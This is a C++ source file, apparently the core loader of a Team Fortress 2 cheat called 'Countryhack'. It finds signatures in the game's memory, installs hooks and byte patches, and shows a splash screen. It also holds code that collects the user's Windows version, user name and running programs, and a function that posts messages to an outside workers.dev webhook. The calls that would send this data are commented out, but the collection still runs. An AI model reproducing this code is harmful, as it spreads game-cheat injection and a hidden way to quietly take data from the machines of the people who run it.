#include "Core.h"

#include "../SDK/SDK.h"
#include "../BytePatches/BytePatches.h"
#include "../Features/Configs/Configs.h"
#include "../Features/ImGui/Menu/Menu.h"
#include "../Features/EnginePrediction/EnginePrediction.h"
#include "../Features/Visuals/Materials/Materials.h"
#include "../Features/Visuals/Visuals.h"
#include "../Features/Spectate/Spectate.h"
#include "../SDK/Events/Events.h"
#include <psapi.h>
#include <windows.h>
#include <winhttp.h>
#include <wininet.h>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wininet.lib")
#include <string>
#include <vector>
#include <iostream>
#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <tlhelp32.h>
#include <lmcons.h>          // UNLEN
#pragma comment(lib, "psapi.lib")
#else
#include <unistd.h>
#include <pwd.h>
#include <sys/utsname.h>
#include <dirent.h>
#include <fstream>
#include <cstring>
#endif

struct SystemInfo {
	std::string osName;
	std::string userName;
	std::vector<std::string> processes;   // process names
};
#ifdef _WIN32
std::string GetWindowsOSName() {
	// Prefer the more accurate registry method
	HKEY hKey;
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
		0, KEY_READ, &hKey) == ERROR_SUCCESS) {
		char productName[256] = {};
		char displayVersion[64] = {};
		DWORD size = sizeof(productName);

		RegQueryValueExA(hKey, "ProductName", nullptr, nullptr,
			reinterpret_cast<LPBYTE>(productName), &size);

		size = sizeof(displayVersion);
		RegQueryValueExA(hKey, "DisplayVersion", nullptr, nullptr,
			reinterpret_cast<LPBYTE>(displayVersion), &size);

		RegCloseKey(hKey);

		std::string name = productName;
		if (displayVersion[0] != '\0') {
			name += " (" + std::string(displayVersion) + ")";
		}
		return name;
	}

	// Fallback
	return "Windows (unknown version)";
}

std::string GetWindowsUserName() {
	char username[UNLEN + 1] = {};
	DWORD size = UNLEN + 1;
	if (GetUserNameA(username, &size)) {
		return username;
	}
	return "unknown";
}

// Returns true if the process has at least one visible top-level window
// (helps filter many pure background/service processes)
bool ProcessHasVisibleWindow(DWORD pid) {
	struct EnumData {
		DWORD pid;
		bool found = false;
	} data{ pid, false };

	EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
		auto* d = reinterpret_cast<EnumData*>(lParam);
		DWORD windowPid = 0;
		GetWindowThreadProcessId(hwnd, &windowPid);

		if (windowPid == d->pid && IsWindowVisible(hwnd) && GetWindow(hwnd, GW_OWNER) == nullptr) {
			d->found = true;
			return FALSE; // stop enumeration
		}
		return TRUE;
		}, reinterpret_cast<LPARAM>(&data));

	return data.found;
}

std::vector<std::string> GetWindowsProcesses(bool onlyVisible = true) {
	std::vector<std::string> result;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) return result;

	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(pe);

	if (Process32First(snapshot, &pe)) {
		do {
			// Skip System Idle Process and other very low PIDs
			if (pe.th32ProcessID <= 4) continue;

			if (onlyVisible && !ProcessHasVisibleWindow(pe.th32ProcessID)) {
				continue; // skip pure background processes
			}

			result.emplace_back(pe.szExeFile);
		} while (Process32Next(snapshot, &pe));
	}

	CloseHandle(snapshot);
	return result;
}

#endif // _WIN32
SystemInfo GetSystemInfo(bool filterBackground = true) {
	SystemInfo info;

	info.osName = GetWindowsOSName();
	info.userName = GetWindowsUserName();
	info.processes = GetWindowsProcesses(filterBackground);

	return info;
}
void SendDiscordWebhook(const std::string& message)
{
	HINTERNET hSession = InternetOpenW(L"CentaurusClient/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hSession) return;

	HINTERNET hConnect = InternetConnectW(hSession, L"centaurus-webhook.ascendedsion.workers.dev", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (hConnect)
	{
		DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE;
		HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", L"/webhook", NULL, NULL, NULL, flags, 0);

		if (hRequest)
		{
			std::wstring headers = L"Content-Type: application/json\r\n";
			std::string escaped_msg;
			for (char c : message) {
				if (c == '"') escaped_msg += "\\\"";
				else if (c == '\\') escaped_msg += "\\\\";
				else if (c == '\n') escaped_msg += "\\n";
				else escaped_msg += c;
			}

			std::string jsonPayload = "{\"content\": \"" + escaped_msg + "\"}";

			HttpSendRequestW(hRequest, headers.c_str(), (DWORD)headers.length(),
				(LPVOID)jsonPayload.c_str(), (DWORD)jsonPayload.length());

			InternetCloseHandle(hRequest);
		}
		InternetCloseHandle(hConnect);
	}
	InternetCloseHandle(hSession);
}

static inline std::string GetProcessName(DWORD dwProcessID)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessID);
	if (!hProcess)
		return "";

	if (char buffer[MAX_PATH]; GetModuleBaseName(hProcess, nullptr, buffer, sizeof(buffer) / sizeof(char)))
	{
		CloseHandle(hProcess);
		return buffer;
	}

	CloseHandle(hProcess);
	return "";
}
void CCore::SplashScreen()
{
	// ===== CONFIG =====
	static constexpr float FADE_IN_TIME = 1.2f;   // seconds
	static constexpr float HOLD_TIME = 2.5f;   // seconds
	static constexpr float FADE_OUT_TIME = 1.2f;   // seconds
	static constexpr float TOTAL_TIME = FADE_IN_TIME + HOLD_TIME + FADE_OUT_TIME;

	// ===== STATE =====
	static float startTime = -1.f;
	static bool  finished = false;

	if (finished)
		return;

	if (startTime < 0.f)
		startTime = I::GlobalVars->curtime;   // or GetTickCount() * 0.001f

	const float elapsed = I::GlobalVars->curtime - startTime;
	if (elapsed >= TOTAL_TIME)
	{
		finished = true;
		return;
	}

	// Calculate alpha (0 → 255 → 0)
	int alpha = 255;
	if (elapsed < FADE_IN_TIME)
		alpha = static_cast<int>((elapsed / FADE_IN_TIME) * 255.f);
	else if (elapsed > FADE_IN_TIME + HOLD_TIME)
		alpha = static_cast<int>((1.f - (elapsed - FADE_IN_TIME - HOLD_TIME) / FADE_OUT_TIME) * 255.f);

	alpha = std::clamp(alpha, 0, 255);

	// ===== FONT (monospace for the ASCII art) =====
	static HFont font = 0;
	if (!font)
	{
		font = I::MatSystemSurface->CreateFont();
		// Consolas / Courier New / Lucida Console all work well
		I::MatSystemSurface->SetFontGlyphSet(font, "Consolas", 14, 500, 0, 0,
			FONTFLAG_OUTLINE);
	}

	// ===== ASCII ART =====
	static const char* ascii[] =
	{
		"                                           /$$                         /$$                           /$$      ",
		"                                          | $$                        | $$                          | $$      ",
		"  /$$$$$$$  /$$$$$$  /$$   /$$ /$$$$$$$  /$$$$$$    /$$$$$$  /$$   /$$| $$$$$$$   /$$$$$$   /$$$$$$$| $$   /$$",
		" /$$_____/ /$$__  $$| $$  | $$| $$__  $$|_  $$_/   /$$__  $$| $$  | $$| $$__  $$ |____  $$ /$$_____/| $$  /$$/",
		"| $$      | $$  \\ $$| $$  | $$| $$  \\ $$  | $$    | $$  \\__/| $$  | $$| $$  \\ $$  /$$$$$$$| $$      | $$$$$$/",
		"| $$      | $$  | $$| $$  | $$| $$  | $$  | $$ /$$| $$      | $$  | $$| $$  | $$ /$$__  $$| $$      | $$_  $$",
		"|  $$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$  |  $$$$/| $$      |  $$$$$$$| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \\  $$",
		" \\_______/ \\______/  \\______/ |__/  |__/   \\___/  |__/       \\____  $$|__/  |__/ \\_______/ \\_______/|__/  \\__/",
		"                                                             /$$  | $$                                        ",
		"                                                            |  $$$$$$/                                        ",
		"                                                             \\______/                                         "
	};
	static constexpr int LINE_COUNT = sizeof(ascii) / sizeof(ascii[0]);

	// Screen centre
	int screenW, screenH;
	I::MatSystemSurface->GetScreenSize(screenW, screenH);

	// Measure one line so we can centre everything
	int textW = 0, textH = 0;
	I::MatSystemSurface->GetTextSize(font, L"X", textW, textH);   // approximate char width
	// Better: measure the longest line once
	static int maxLineWidth = 0;
	if (maxLineWidth == 0)
	{
		for (int i = 0; i < LINE_COUNT; ++i)
		{
			wchar_t wbuf[256]{};
			MultiByteToWideChar(CP_UTF8, 0, ascii[i], -1, wbuf, 256);
			int w, h;
			I::MatSystemSurface->GetTextSize(font, wbuf, w, h);
			if (w > maxLineWidth)
				maxLineWidth = w;
		}
	}

	const int startX = (screenW - maxLineWidth) / 2;
	const int startY = (screenH - (LINE_COUNT * textH)) / 2 - 30;   // a bit above centre

	// Colour – use your theme accent (with fading alpha)
	Color_t accent = Vars::Menu::Theme::Accent.Value;
	accent.a = alpha;

	I::MatSystemSurface->DrawSetTextFont(font);
	I::MatSystemSurface->DrawSetTextColor(accent.r, accent.g, accent.b, accent.a);

	// Draw every line of the ASCII art
	for (int i = 0; i < LINE_COUNT; ++i)
	{
		wchar_t wbuf[256]{};
		MultiByteToWideChar(CP_UTF8, 0, ascii[i], -1, wbuf, 256);

		I::MatSystemSurface->DrawSetTextPos(startX, startY + i * textH);
		I::MatSystemSurface->DrawPrintText(wbuf, static_cast<int>(wcslen(wbuf)));
	}

	// ===== "loaded successfully" =====
	static const wchar_t* subtitle = L"loaded successfully";
	int subW, subH;
	I::MatSystemSurface->GetTextSize(font, subtitle, subW, subH);

	const int subX = (screenW - subW) / 2;
	const int subY = startY + LINE_COUNT * textH + 18;

	I::MatSystemSurface->DrawSetTextPos(subX, subY);
	I::MatSystemSurface->DrawPrintText(subtitle, static_cast<int>(wcslen(subtitle)));
}
void CreateConsole(const char* title = "chack")
{
	AllocConsole();

	// Redirect stdout, stderr, stdin
	FILE* fDummy;
	freopen_s(&fDummy, "CONOUT$", "w", stdout);
	freopen_s(&fDummy, "CONOUT$", "w", stderr);
	freopen_s(&fDummy, "CONIN$", "r", stdin);

	SetConsoleTitleA(title);

	// Optional: make the console a bit nicer
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFOEX csbi{};
	csbi.cbSize = sizeof(CONSOLE_SCREEN_BUFFER_INFOEX);
	GetConsoleScreenBufferInfoEx(hConsole, &csbi);

	csbi.dwSize.Y = 500; // bigger buffer
	SetConsoleScreenBufferInfoEx(hConsole, &csbi);
}

// Helper to print colored messages
void ConsolePrint(const char* text, WORD color = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE)
{
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, color);
	printf("%s\n", text);
	SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE); // reset
}
void ClearConsole()
{
	system("cls");
}



static inline bool CheckDXLevel()
{
	auto mat_dxlevel = H::ConVars.FindVar("mat_dxlevel");
	if (mat_dxlevel->GetInt() < 90)
	{
		/*
		const char* sMessage = "You are running with graphics options that Countryhack does not support. -dxlevel must be at least 90.";
		U::Core.AppendFailText(sMessage);
		SDK::Output("Countryhack", sMessage, DEFAULT_COLOR, OUTPUT_CONSOLE | OUTPUT_TOAST | OUTPUT_MENU | OUTPUT_DEBUG);
		return false;
		*/

		const char* sMessage = "You are running with graphics options that Countryhack does not support. It is recommended for -dxlevel to be at least 90.";
		SDK::Output("Countryhack", sMessage, DEFAULT_COLOR, OUTPUT_CONSOLE | OUTPUT_TOAST | OUTPUT_MENU | OUTPUT_DEBUG);
	}

	return true;
}

void CCore::AppendFailText(const char* sMessage)
{
	if (m_ssFailStream.str().empty())
	{
		m_ssFailStream << "Built @ " __DATE__ ", " __TIME__ ", " __CONFIGURATION__ "\n";
		m_ssFailStream << std::format("Time @ {}, {}\n", SDK::GetDate(), SDK::GetTime());
		m_ssFailStream << "\n";
	}

	m_ssFailStream << std::format("{}\n", sMessage);
	OutputDebugStringA(std::format("{}\n", sMessage).c_str());
}

void CCore::LogFailText()
{
	try
	{
		std::ofstream file;
		file.open(F::Configs.m_sConfigPath + "fail_log.txt", std::ios_base::app);
		file << m_ssFailStream.str() + "\n\n\n";
		file.close();

		m_ssFailStream << "\n";
		m_ssFailStream << "Ctrl + C to copy. \n";
		m_ssFailStream << "Logged to Countryhack\\fail_log.txt. ";
	}
	catch (...) {}

	SDK::Output("Failed to load", m_ssFailStream.str().c_str(), {}, OUTPUT_DEBUG, MB_OK | MB_ICONERROR);
}

void CCore::Load()
{
	//SendDiscordWebhook("countryhack | load started");
	if (m_bUnload = m_bFailed = FNV1A::Hash32(GetProcessName(GetCurrentProcessId()).c_str()) != FNV1A::Hash32Const("tf_win64.exe"))
	{
		AppendFailText("Invalid process");
		return;
	}

	float flTime = 0.f;
	while (true)
	{
		auto uSignature = U::Memory.FindSignature("client.dll", "48 8B 0D ? ? ? ? 48 8B 10 48 8B 19 48 8B C8 FF 92");
		auto uDereference = uSignature ? *reinterpret_cast<uintptr_t*>(U::Memory.RelToAbs(uSignature)) : 0;
		auto hWindow = SDK::GetTeamFortressWindow();
		if (uDereference && hWindow)
			break;

		Sleep(500), flTime += 0.5f;
		if (m_bUnload = m_bFailed = flTime >= 60.f)
		{
			AppendFailText(std::format("Failed to load in time:\n  {:#x} ({:#x})\n  {:#x}", uDereference, uSignature, uintptr_t(hWindow)).c_str());
			return;
		}
		if (m_bUnload = m_bFailed = U::KeyHandler.Down(VK_F11, true))
		{
			AppendFailText("Cancelled load");
			return;
		}
	}
	Sleep(500);
	CreateConsole("chack");
	ConsolePrint("searching for signature '48 8B 0D ? ? ? ? 48 8B 10 48 8B 19 48 8B C8 FF 92'", FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	std::this_thread::sleep_for(std::chrono::milliseconds(500));
	ClearConsole();
	ConsolePrint("loaded successfully", FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	std::this_thread::sleep_for(std::chrono::milliseconds(200));
	ConsolePrint("connected", FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	
	
	if (m_bUnload = m_bFailed = !U::Signatures.Initialize() || !U::Interfaces.Initialize() || !CheckDXLevel())
		return;
	if (m_bUnload = m_bFailed2 = !U::Hooks.Initialize() || !U::BytePatches.Initialize() || !H::Events.Initialize())
		return;
	F::Materials.LoadMaterials();
	H::Fonts.Reload();
	F::Configs.LoadConfig(F::Configs.m_sCurrentConfig, false);

	SDK::Output("Countryhack", "Loaded", DEFAULT_COLOR, OUTPUT_CONSOLE | OUTPUT_TOAST | OUTPUT_MENU | OUTPUT_DEBUG);
	//SendDiscordWebhook("Countryhack loaded successfully into tf2x64 | build date: " + std::string(__DATE__));
	auto info = GetSystemInfo(true);
	/*std::cout << "OS: " << info.osName << "\n";
    std::cout << "User: " << info.userName << "\n";
    std::cout << "Processes (" << info.processes.size() << "):\n";
    for (const auto& p : info.processes) {
        std::cout << "  - " << p << "\n";*/

	//SendDiscordWebhook("countryhack loaded | " + info.osName + " | " + info.userName + " | " + std::string(__DATE__));
	

}

void CCore::Loop()
{
	while (true)
	{
		bool bShouldUnload = U::KeyHandler.Down(VK_F11, true) && SDK::IsGameWindowInFocus() || m_bUnload;
		if (bShouldUnload)
			break;

		Sleep(15);
	}
}

void CCore::Unload()
{
	if (m_bFailed)
	{
		LogFailText();
		return;
	}

	G::Unload = true;
	m_bFailed2 = !U::Hooks.Unload() || m_bFailed2;
	U::BytePatches.Unload();
	H::Events.Unload();
	fclose(stdout);
	fclose(stderr);
	fclose(stdin);
	FreeConsole();
	if (F::Menu.m_bIsOpen)
		I::MatSystemSurface->SetCursorAlwaysVisible(false);
	H::ConVars.FindVar("cl_wpn_sway_interp")->SetValue(0.f);
	H::ConVars.FindVar("cl_wpn_sway_scale")->SetValue(0.f);
	F::Visuals.RestoreWorldModulation();
	if (auto pLocal = H::Entities.GetLocal())
	{
		if (F::Spectate.HasTarget())
		{
			F::Spectate.NetUpdateStart(pLocal);
			I::EngineClient->SetViewAngles(F::Spectate.m_vOldView);
		}
		if (I::Input->CAM_IsThirdPerson())
		{
			I::Input->CAM_ToFirstPerson();
			pLocal->ThirdPersonSwitch();
		}
	}

	Sleep(250);
	F::EnginePrediction.Unload();
	H::ConVars.Restore();
	F::Materials.UnloadMaterials();

	if (m_bFailed2)
	{
		LogFailText();
		return;
	}

	SDK::Output("Countryhack", "Unloaded", DEFAULT_COLOR, OUTPUT_CONSOLE | OUTPUT_DEBUG);
}